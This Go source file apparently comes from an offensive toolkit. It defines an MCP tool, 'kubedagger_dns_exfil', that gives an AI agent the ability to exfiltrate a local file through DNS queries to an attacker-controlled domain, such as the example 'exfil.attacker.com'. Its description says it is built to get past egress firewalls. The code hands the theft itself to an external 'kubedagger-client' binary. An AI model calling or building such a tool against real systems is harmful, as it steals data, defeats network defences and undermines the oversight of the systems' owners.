package kubedagger

import (
	"context"
	"encoding/json"
	"fmt"
	"strings"

	"github.com/yasindce1998/redhands/pkg/executor"
	"github.com/yasindce1998/redhands/pkg/mcp"
)

type DNSExfilInput struct {
	File   string `json:"file"`
	Domain string `json:"domain"`
	Server string `json:"server,omitempty"`
}

type DNSExfilTool struct {
	exec executor.Executor
}

func NewDNSExfil(exec executor.Executor) *DNSExfilTool {
	return &DNSExfilTool{exec: exec}
}

func (t *DNSExfilTool) Name() string { return "kubedagger_dns_exfil" }

func (t *DNSExfilTool) Description() string {
	return "Exfiltrate a file via DNS queries by encoding its contents in subdomain labels sent to an attacker-controlled domain. Bypasses egress firewalls that block direct connections but allow DNS resolution."
}

func (t *DNSExfilTool) InputSchema() json.RawMessage {
	return json.RawMessage(`{
		"type": "object",
		"properties": {
			"file": {
				"type": "string",
				"description": "Local file path to exfiltrate (required)"
			},
			"domain": {
				"type": "string",
				"description": "Attacker-controlled domain for DNS exfiltration, e.g. 'exfil.attacker.com' (required)"
			},
			"server": {
				"type": "string",
				"description": "DNS server to query (default: 8.8.8.8)"
			}
		},
		"required": ["file", "domain"]
	}`)
}

func (t *DNSExfilTool) Execute(ctx context.Context, params json.RawMessage) (*mcp.ToolResult, error) {
	var input DNSExfilInput
	if err := json.Unmarshal(params, &input); err != nil {
		return errorResult("invalid input: " + err.Error()), nil
	}

	if input.File == "" {
		return errorResult("file is required"), nil
	}
	if input.Domain == "" {
		return errorResult("domain is required"), nil
	}
	if err := validateSafeString(input.File, "file"); err != nil {
		return errorResult(err.Error()), nil
	}
	if err := validateSafeString(input.Domain, "domain"); err != nil {
		return errorResult(err.Error()), nil
	}
	if err := validateSafeString(input.Server, "server"); err != nil {
		return errorResult(err.Error()), nil
	}

	args := []string{"dns_exfil", "--file", input.File, "--domain", input.Domain}
	if input.Server != "" {
		args = append(args, "--server", input.Server)
	}

	result, err := t.exec.Run(ctx, "kubedagger-client", args...)
	if err != nil {
		stderr := ""
		if result != nil {
			stderr = string(result.Stderr)
		}
		return errorResult(fmt.Sprintf("kubedagger dns_exfil failed: %s\n%s", err.Error(), stderr)), nil
	}

	output := strings.TrimSpace(string(result.Stdout))
	var sb strings.Builder
	fmt.Fprintf(&sb, "## KubeDagger DNS Exfiltration: %s\n\n", input.Domain)
	if output == "" {
		sb.WriteString("Exfiltration complete.\n")
	} else {
		sb.WriteString("```\n")
		sb.WriteString(output)
		sb.WriteString("\n```\n")
	}

	return &mcp.ToolResult{
		Content: []mcp.ContentBlock{{Type: "text", Text: sb.String()}},
	}, nil
}
